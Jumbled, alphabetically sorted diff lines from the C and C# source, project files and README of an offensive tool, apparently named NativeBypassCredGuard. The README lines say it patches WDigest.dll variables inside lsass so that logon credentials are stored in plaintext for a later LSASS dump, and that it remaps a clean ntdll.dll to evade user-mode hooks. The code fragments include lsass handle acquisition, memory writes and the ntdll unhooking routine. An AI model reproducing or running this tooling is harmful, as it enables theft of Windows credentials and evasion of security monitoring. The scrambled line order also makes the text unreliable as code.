+"                Console.WriteLine(""[-] Error calling CloseHandle"")"
+"                Console.WriteLine(""[-] Error calling CreateProcess"")"
+"                Console.WriteLine(""[-] Error calling DebugActiveProcessStop"")"
+"                Console.WriteLine(""[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)"")"
+"                Console.WriteLine(""[-] Error calling NtProtectVirtualMemory (dwOldProtection)"")"
+"                Console.WriteLine(""[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x"" "
+"                Console.WriteLine(""[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x"" "
+"                Console.WriteLine(""[-] Error calling NtReadVirtualMemory"")"
+"                Console.WriteLine(""[-] Error calling NtTerminateProcess. NTSTATUS:"" "
+"                Console.WriteLine(""[-] File must be compiled as 64-byte binary."")"
+"                Console.WriteLine(""[-] Incorrect DOS header signature"")"
+"                Console.WriteLine(""[-] Incorrect NT header signature"")"
+"                Console.WriteLine(""[-] Incorrect Optional Header Magic field value"")"
+"                Console.WriteLine(""[-] PEB structure is not readable."")"
+"                Console.WriteLine($""Error: {ex.Message}"")"
+"                Console.WriteLine($""["
+"                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink "
+"                IntPtr hModule = CustomGetModuleHandle(lsassHandle, dllName)"
+"                NtReadVirtualMemory(hProcess, (BYTE"
+"                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, "
+"                address,"
+"                bool openfile_bool = OpenFile(filePath, out fileHandle)"
+"                bool parse_bool = ParsePEFile(fileBytes, out int offset, out int useLogonCredential, out int isCredGuardEnabled, out byte[] matchedBytes)"
+"                bool readval_icge_bool = ReadValues(lsassHandle, isCredGuardEnabled_Address, out byte[] isCredGuardEnabled_buffer)"
+"                bool readval_ulcr_bool = ReadValues(lsassHandle, useLogonCredential_Address, out byte[] useLogonCredential_buffer)"
+"                case ""check"":"
+"                case ""patch"":"
+"                dll_base = ReadRemoteIntPtr(hProcess, (next_flink "
+"                if (option == ""patch"")"
+"                if (sectionName == "".text"")"
+"                next_flink = ReadRemoteIntPtr(hProcess, (next_flink "
+"                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero)"
+"                processHandle,"
+"                ref value,"
+"                sizeof(uint),"
+"                string base_dll_name = ReadRemoteWStr(hProcess, buffer)"
+"                string sectionName = Encoding.ASCII.GetString(buffer, sectionOffset, 8).TrimEnd('"
+"                throw new Exception($""Failed to open file handle. NTSTATUS: 0x{status.ToString(""X"")}"")"
+"                throw new Exception($""Failed to read file. NTSTATUS: 0x{status.ToString(""X"")}"")"
+"                throw new InvalidOperationException($""Failed to write memory. Error code: {Marshal.GetLastWin32Error()}"")"
+"                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY "
+"                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength)"
+"                uint ntstatus = NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength)"
+"               0,"
+"               FILE_OPEN,"
+"               FILE_SHARE_READ,"
+"               IntPtr.Zero,"
+"               out _,"
+"               out fileHandle,"
+"               ref objectAttributes,"
+"            // 0x103 is Status Pending, it seems it works ok :S"
+"            // Console.WriteLine(""["
+"            // e_lfanew in offset 0x3C in _IMAGE_DOS_HEADER structure, its size is 4 bytes "
+"            Console.WriteLine(""["
+"            IntPtr commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer)"
+"            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer)"
+"            IntPtr localNtdllHandle = CustomGetModuleHandle(currentProcess, ""ntdll.dll"")"
+"            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList)"
+"            IntPtr processparameters_adress = ReadRemoteIntPtr(process_handle, processparameters_pointer)"
+"            Marshal.StructureToPtr(unicodeString, objectAttributes.ObjectName, false)"
+"            NtReadVirtualMemory(hProcess, addressOfNamesRA, "
+"            NtReadVirtualMemory(hProcess, baseofcode_addr, data, data.Length, out _)"
+"            NtReadVirtualMemory(hProcess, e_lfanew_addr, data, 4, out _)"
+"            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) "
+"            NtReadVirtualMemory(hProcess, image_nt_headers_addr, data, data.Length, out _)"
+"            NtReadVirtualMemory(hProcess, optional_headers_addr, data, data.Length, out _)"
+"            NtReadVirtualMemory(hProcess, signature_addr, data, data.Length, out _)"
+"            NtReadVirtualMemory(hProcess, sizeofcode_addr, data, data.Length, out _)"
+"            ReplaceNtdllTxtSection(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize)"
+"            bool createprocess_res = CreateProcess(process_path, null, IntPtr.Zero, IntPtr.Zero, false, DEBUG_PROCESS, IntPtr.Zero, null, ref si, out pi)"
+"            if (NtReadVirtualMemory(processHandle, address, buffer, (uint)buffer.Length, out bytesReadProcess) == 0)"
+"            if (signature_dos_header != ""MZ"")"
+"            if (signature_nt_header != ""PE"")"
+"            if (strcmp(functionName, func_name) == 0) {"
+"            int baseofcode = BitConverter.ToInt32(data, 0)"
+"            int e_lfanew = BitConverter.ToInt32(data, 0)"
+"            int numberOfSections = BitConverter.ToUInt16(buffer, peHeaderOffset "
+"            int optional_header_magic = BitConverter.ToInt16(data, 0)"
+"            int peHeaderOffset = BitConverter.ToInt32(buffer, 0x3C)"
+"            int sizeOfOptionalHeader = BitConverter.ToUInt16(buffer, peHeaderOffset "
+"            int sizeofcode = BitConverter.ToInt32(data, 0)"
+"            int[] result = { baseofcode, sizeofcode }"
+"            long value = BitConverter.ToInt64(buff, 0)"
+"            printf(""%02X "", matchedBytes[i])"
+"            printf(""Pattern not found."
+"            printf(""["
+"            string commandline_value = ReadRemoteWStr(process_handle, commandline_address)"
+"            string dllName = ""wdigest.dll"""
+"            string filePath = @"""
+"            string proc_name = ""c:"
+"            string process_path = ""c:"
+"            string unicode_str = """""
+"            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, (uint)buff.Length, out _)"
+"            uint peSignature = BitConverter.ToUInt32(buffer, peHeaderOffset)"
+"            uint readprocmem_res = NtReadVirtualMemory(pi.hProcess, localNtdllTxt, ntdllBuffer, ntdllBuffer.Length, out _)"
+"            uint terminateproc_res = NtTerminateProcess(pi.hProcess, 0)"
+"            uint vp_res = NtProtectVirtualMemory(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, PAGE_EXECUTE_WRITECOPY, out dwOldProtection)"
+"            uint vp_res2 = NtProtectVirtualMemory(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, dwOldProtection, out dwOldProtection)"
+"            while (NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle) == 0)"
+"        // Create debug process, map its ntdl.dll .text section and copy it to a new buffer, return the buffer address"
+"        // if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, "
+"        0,"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.7.2"" />"
+"        DEBUG_PROCESS,"
+"        FALSE,"
+"        FILE_OPEN,"
+"        FILE_SHARE_READ,"
+"        NULL,"
+"        NtReadVirtualMemory(hProcess, (BYTE"
+"        [DllImport(""kernel32.dll"")] public static extern bool DebugActiveProcessStop(int dwProcessId)"
+"        [DllImport(""kernel32.dll"", CharSet = CharSet.Unicode, SetLastError = true)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtClose(IntPtr hObject)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtCreateFile(out IntPtr FileHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, out IO_STATUS_BLOCK IoStatusBlock, IntPtr AllocationSize, uint FileAttributes, uint ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtGetNextProcess(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtReadFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, ref LARGE_INTEGER ByteOffset, IntPtr Key)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtTerminateProcess(IntPtr ProcessHandle, int ExitStatus)"
+"        [DllImport(""ntdll.dll"")] public static extern uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, ref uint buffer, uint bufferSize, out uint bytesWritten)"
+"        address,"
+"        bool setval_bool = SetValue(lsassHandle, (void"
+"        dll_base = (uintptr_t)ReadRemoteUintptr_t(hProcess, (void"
+"        exec(""check"", debug)"
+"        exec(""patch"", debug)"
+"        fileBytes,"
+"        fileHandle,"
+"        fprintf(stderr, ""Failed to allocate memory for fileBytes."
+"        fprintf(stderr, ""Failed to open file handle. NTSTATUS: 0x%08X"
+"        fprintf(stderr, ""Failed to read file. NTSTATUS: 0x%08X"
+"        if (strcmp(base_dll_name, dll_name) == 0) {"
+"        if (strcmp(sectionName, "".text"") == 0) {"
+"        localNtdllTxt,"
+"        localNtdllTxtSize,"
+"        memcpy(sectionName, buffer "
+"        next_flink = ReadRemoteIntPtr(hProcess, (void"
+"        ntdllBuffer,"
+"        pi.hProcess,"
+"        printf("""
+"        printf(""Failed to write memory. Error code: %lu"
+"        printf(""Not a valid PE file."
+"        printf(""["
+"        printf(""[-] Error calling CreateProcess"
+"        printf(""[-] Error calling DebugActiveProcessStop or TerminateProcess"
+"        printf(""[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue."
+"        printf(""[-] Error calling NtClose"
+"        printf(""[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X"
+"        printf(""[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)"
+"        printf(""[-] Error calling NtProtectVirtualMemory (dwOldProtection)"
+"        printf(""[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X"
+"        printf(""[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p"
+"        printf(""[-] Error calling NtReadVirtualMemory (ReadRemoteUintptr_t). NTSTATUS: 0x%X reading address 0x%p"
+"        printf(""[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p"
+"        printf(""[-] Error calling NtReadVirtualMemory"
+"        printf(""[-] Error reading BaseOfCode"
+"        printf(""[-] Error reading DOS header signature"
+"        printf(""[-] Error reading NT header signature"
+"        printf(""[-] Error reading Optional Header Magic"
+"        printf(""[-] Error reading SizeOfCode"
+"        printf(""[-] Error reading e_lfanew"
+"        printf(""[-] Failed to parse PE file."
+"        printf(""[-] Failed to read DLL."
+"        printf(""[-] File must be compiled as 64-bit binary."
+"        printf(""[-] Incorrect DOS header signature"
+"        printf(""[-] Incorrect NT header signature"
+"        printf(""[-] Incorrect Optional Header Magic field value"
+"        printf(""[-] It was not possible to get lsass handle."")"
+"        printf(""[-] PEB structure is not readable."
+"        processHandle,"
+"        process_path,"
+"        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)"
+"        public static bool SetValue(IntPtr processHandle, IntPtr address, uint value)"
+"        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)"
+"        public static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)"
+"        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name)"
+"        setval_bool = SetValue(lsassHandle, (void"
+"        sizeof(uint32_t),"
+"        static bool OpenFile(string filePath, out IntPtr fileHandle)"
+"        static bool ParsePEFile(byte[] buffer, out int offset, out int useLogonCredential, out int isCredGuardEnabled, out byte[] matchedBytes)"
+"        static bool ReadValues(IntPtr processHandle, IntPtr address, out byte[] buffer)"
+"        static void exec(string option, bool debug)"
+"    // uintptr_t hModule = (uintptr_t)LoadLibraryA(""wdigest.dll"")"
+"    <ClCompile Include=""NativeBypassCredGuard_C"
+"    <Compile Include=""NT.cs"" />"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <Filter Include=""Header Files"">"
+"    <Filter Include=""Resource Files"">"
+"    <Filter Include=""Source Files"">"
+"    <Import Project=""$(UserRootDir)"
+"    <None Include=""App.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <ProjectConfiguration Include=""Debug"
+"    <ProjectConfiguration Include=""Release"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    HMODULE hNtdll = LoadLibraryA(""ntdll.dll"")"
+"    NTSTATUS ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY "
+"    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, "
+"    NTSTATUS ntstatus = NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, "
+"    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), "
+"    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(uintptr_t), "
+"    NTSTATUS ntstatus = NtReadVirtualMemory(processHandle, address, buffer, bufferLength, "
+"    NTSTATUS terminateproc_res = NtTerminateProcess(pi.hProcess, 0)"
+"    NTSTATUS vp_res = NtProtectVirtualMemory(currentProcess, "
+"    NTSTATUS vp_res_2 = NtProtectVirtualMemory(currentProcess, "
+"    NtAdjustPrivilegesToken = (NtAdjustPrivilegesTokenFn)CustomGetProcAddress(hNtdll, ""NtAdjustPrivilegesToken"")"
+"    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, ""NtClose"")"
+"    NtCreateFile = (NtCreateFileFn)CustomGetProcAddress(hNtdll, ""NtCreateFile"")"
+"    NtGetNextProcess = (NtGetNextProcessFn)CustomGetProcAddress(hNtdll, ""NtGetNextProcess"")"
+"    NtOpenProcessToken = (NtOpenProcessTokenFn)CustomGetProcAddress(hNtdll, ""NtOpenProcessToken"")"
+"    NtProtectVirtualMemory = (NtProtectVirtualMemoryFn)CustomGetProcAddress(hNtdll, ""NtProtectVirtualMemory"")"
+"    NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, ""NtQueryInformationProcess"")"
+"    NtReadFile = (NtReadFileFn)CustomGetProcAddress(hNtdll, ""NtReadFile"")"
+"    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress((HMODULE)hNtdll, ""NtReadVirtualMemory"")"
+"    NtReadVirtualMemory(hProcess, (BYTE"
+"    NtTerminateProcess = (NtTerminateProcessFn)CustomGetProcAddress(hNtdll, ""NtTerminateProcess"")"
+"    NtWriteVirtualMemory = (NtWriteVirtualMemoryFn)CustomGetProcAddress(hNtdll, ""NtWriteVirtualMemory"")"
+"    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer)"
+"    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer)"
+"    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize)"
+"    bool openfile_bool = OpenFile(filePath, "
+"    bool parse_bool = ParsePEFile(fileBuffer, 1024 "
+"    bool readval_icge_bool = ReadValues(lsassHandle, (void"
+"    bool readval_ulcr_bool = ReadValues(lsassHandle, (void"
+"    else if (strcmp(firstArg, ""patch"") == 0) {"
+"    if ((NtReadVirtualMemory(hProcess, (BYTE"
+"    if ((NtReadVirtualMemory(hProcess, ntdll_address, signature_dos_header, 2, "
+"    if (option == ""patch"") {"
+"    if (strcmp(firstArg, ""check"") == 0) {"
+"    memcpy(localNtdllTxt, unhookedNtdllTxt, localNtdllTxtSize)"
+"    memset(matchedBytes, 0, 18)"
+"    ntstatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, "
+"    printf(""["
+"    uintptr_t hModule = CustomGetModuleHandle(lsassHandle, dllName)"
+"    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, ""ntdll.dll"")"
+"    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, targetDll)"
+"    wchar_t filePath[MAX_PATH] = L"""
+"    while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, "
+"  2024"")]"
+"  6)"")"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <Import Project=""$(VCTargetsPath)"
+"  <ImportGroup Label=""ExtensionSettings"">"
+"  <ImportGroup Label=""ExtensionTargets"">"
+"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
+"  <ImportGroup Label=""Shared"">"
+"  <ItemDefinitionGroup Condition=""'$(Configuration)"
+"  <ItemGroup Label=""ProjectConfigurations"">"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <PropertyGroup Condition=""'$(Configuration)"
+"  <PropertyGroup Label=""Globals"">"
+"  <PropertyGroup Label=""UserMacros"" />"
+" "" bytes from 0x"" "
+" "" reading address 0x"" "
+" "" to 0x"" "
+" "". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue"")"
+" ""true"" : ""false"")"
+" // LookupPrivilegeValue(NULL, ""SeDebugPrivilege"", "
+" 00"" in the WDigest.dll file on disk (as explained in the first post in the References section, the pattern is present in this file in all Windows versions), then calculates the necessary memory addresses, and finally patches the value of two variables within WDigest.dll: "
+" 0x18, "
+" 0x1C, "
+" 0x20, "
+" 0x24, "
+" 0x3C, "
+" 1) % 6 == 0) { Console.Write("" "")"
+" 1, "
+" 1024, "
+" 1024,"
+" 12)"")"
+" 12):X6})"")"
+" 20, "
+" 24, "
+" 4, "
+" 6):X6})"")"
+" BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)"
+" FILE_READ_ATTRIBUTES,"
+" FILE_READ_ATTRIBUTES,// 0x0009, //0x00120089,"
+" InInitializationOrderModuleList.ToString(""X""))"
+" NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID)"
+" NtCreateFileFn)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)"
+" NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE)"
+" NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE)"
+" NtProtectVirtualMemoryFn)(HANDLE ProcessHandle, PVOID"
+" NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)"
+" NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key)"
+" NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T)"
+" NtTerminateProcessFn)(HANDLE ProcessHandle, int ExitStatus)"
+" NtWriteVirtualMemoryFn)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten)"
+" ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {"
+" TOKEN_ADJUST_PRIVILEGES, "
+" TOKEN_ADJUST_PRIVILEGES, ref tokenHandle)"
+" address, BYTE"
+" base_dll_name = ReadRemoteWStr(hProcess, buffer)"
+" buffer = ReadRemoteIntPtr(hProcess, (void"
+" buffer, SIZE_T bufferLength) {"
+" buffer, size_t bufferSize, int"
+" commandline_value = ReadRemoteWStr(process_handle, commandline_address)"
+" dllName = ""wdigest.DLL"""
+" e_lfanew, signature_nt_header, 2, "
+" exportrva_offset, "
+" filePath, HANDLE"
+" isCredGuardEnabled, BYTE"
+" ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer)"
+" localNtdllTxt.ToString(""X""))"
+" mem_address.ToString(""X""))"
+" next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList)"
+" ntstatus.ToString(""X"") "
+" ntstatus.ToString(""X""))"
+" offset, int"
+" option, bool debug) {"
+" pDosHdr, const char"
+" pbi_addr.ToString(""X""))"
+" proc_name = ""c:"
+" proc_path = ""c:"
+" sectionOffset, 8)"
+" strcmp(argv[2], ""true"") == 0) {"
+" strcmp(current_proc_name, proc_name) == 0) {"
+" targetDll = ""ntdll.dll"""
+" terminateproc_res.ToString(""X""))"
+" unhookedNtdllTxt.ToString(""X"") "
+" useLogonCredential, int"
+" } IO_STATUS_BLOCK, "
+" } OBJECT_ATTRIBUTES, "
+" } TOKEN_PRIVILEGES_STRUCT, "
+" } UNICODE_STRING, "
+""", ""NativeBypassCredGuard_C"
+")isCredGuardEnabled_Address, isCredGuardEnabled_Value)"
+")isCredGuardEnabled_Address, isCredGuardEnabled_buffer, 4)"
+")localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize)"
+")unhookedNtdllTxt, (void"
+")useLogonCredential_Address, useLogonCredential_Value)"
+")useLogonCredential_Address, useLogonCredential_buffer, 4)"
+", I didn't test it yet but you can play with the variable "
+"- It will not work if it is not possible to open a handle to lsass or if the PEB structure is not readable. Regarding the latter you can opt for using kernel32!LoadLibrary for loading WDigest.dll in your process to get its base address, instead of using ntdll!NtReadVirtualMemory and ntdll!NtQueryInformationProcess to get it from the lsass process (you have the code for this commented in the C version). But you would be using a function not exported by ntdll.dll but kernel32.dll, and it is probably strange for a process to load that DLL :)"
+".cpp"" />"
+".cpp"">"
+".csproj"", ""{E383DFEA-EC22-4667-9434-3F2591A03740}"""
+".vcxproj"", ""{C4D31433-5017-4B5E-956B-8A540520986C}"""
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""Current"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"= BitConverter.ToChar(buff, i)"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
+"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
+"Microsoft.Cpp.Default.props"" />"
+"Microsoft.Cpp.props"" />"
+"Microsoft.Cpp.targets"" />"
+"PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""NativeBypassCredGuard_C"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""NativeBypassCredGuard_C"
+"The tool locates the pattern ""39 "
+"This forces plaintext credential storage in memory, ensuring that from that point forward credentials are stored in cleartext whenever users log in. As a result, next time the LSASS process is dumped it may contain passwords in plaintext."
+"Using only NTAPI functions, it is possible to remap the ntdll.dll library to bypass user-mode hooks and security mechanisms, which is an optional feature of the tool. If used, a clean version of ntdll.dll is obtained from a process created in debugged mode."
+"Win32"">"
+"Win32'"" Label=""Configuration"">"
+"Win32'"">"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""C"
+"[assembly: AssemblyTitle(""C"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""e383dfea-ec22-4667-9434-3f2591a03740"")]"
+"addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), "
+"addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), "
+"addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), "
+"aux, 0x80, "
+"aux, dwOldProtection, "
+"baseofcode, 4, "
+"bool ReadValues(HANDLE processHandle, void"
+"bool SetValue(HANDLE processHandle, LPVOID address, uint32_t value) {"
+"byteOffset,"
+"calc.exe"""
+"e_lfanew, 4, "
+"e_lfanew_value, sizeof(e_lfanew_value), "
+"exportTableRVA_value, sizeof(exportTableRVA_value), "
+"functionAddress, sizeof(functionAddress), "
+"functionAddressVRA, sizeof(functionAddressVRA), "
+"int main(int argc, char"
+"ioStatusBlock,"
+"isCredGuardEnabled, matchedBytes)"
+"localNtdllTxt, "
+"lsass.exe"""
+"n           - Writes new values and remaps the ntdll library."")"
+"n"", (intptr_t)fileHandle)"
+"n"", (long long)lsassHandle)"
+"n"", (unsigned long long)hModule)"
+"n"", (unsigned long long)isCredGuardEnabled_Address, (unsigned long long)hModule, isCredGuardEnabled_Offset)"
+"n"", (unsigned long long)useLogonCredential_Address, (unsigned long long)hModule, useLogonCredential_Offset)"
+"n"", GetLastError())"
+"n"", debug "
+"n"", isCredGuardEnabled_Offset, isCredGuardEnabled)"
+"n"", isCredGuardEnabled_Value, isCredGuardEnabled_Address)"
+"n"", isCredGuardEnabled_buffer[0], isCredGuardEnabled_buffer[1], isCredGuardEnabled_buffer[2], isCredGuardEnabled_buffer[3])"
+"n"", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt)"
+"n"", ntstatus)"
+"n"", ntstatus, mem_address)"
+"n"", offset)"
+"n"", status)"
+"n"", useLogonCredential_Offset, useLogonCredential)"
+"n"", useLogonCredential_Value, useLogonCredential_Address)"
+"n"", useLogonCredential_buffer[0], useLogonCredential_buffer[1], useLogonCredential_buffer[2], useLogonCredential_buffer[3])"
+"numberOfNames_value, sizeof(numberOfNames_value), "
+"objectAttributes,"
+"offset, "
+"optional_header_magic, 2, "
+"ordinal, sizeof(ordinal), "
+"sizeofcode, 4, "
+"sizeopthdr_value, sizeof(sizeopthdr_value), "
+"t0x"" "
+"t0x{hModule.ToInt64():X}"")"
+"t0x{isCredGuardEnabled_Address.ToInt64():X} (isCredGuardEnabled)"")"
+"t0x{offset:X}"")"
+"t0x{useLogonCredential_Address.ToInt64():X} (useLogonCredential)"")"
+"tCopied "" "
+"tOK"")"
+"tTrue"")"
+"tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)"
+"t{debug}"")"
+"t{fileHandle}"")"
+"t{isCredGuardEnabled_buffer[0]:X2} {isCredGuardEnabled_buffer[1]:X2} {isCredGuardEnabled_buffer[2]:X2} {isCredGuardEnabled_buffer[3]:X2}"")"
+"t{lsassHandle}"")"
+"t{useLogonCredential_buffer[0]:X2} {useLogonCredential_buffer[1]:X2} {useLogonCredential_buffer[2]:X2} {useLogonCredential_buffer[3]:X2}"")"
+"uintptr_t CustomGetModuleHandle(HANDLE hProcess, const char"
+"uintptr_t ReadRemoteUintptr_t(HANDLE hProcess, PVOID mem_address) {"
+"useLogonCredential, "
+"value,"
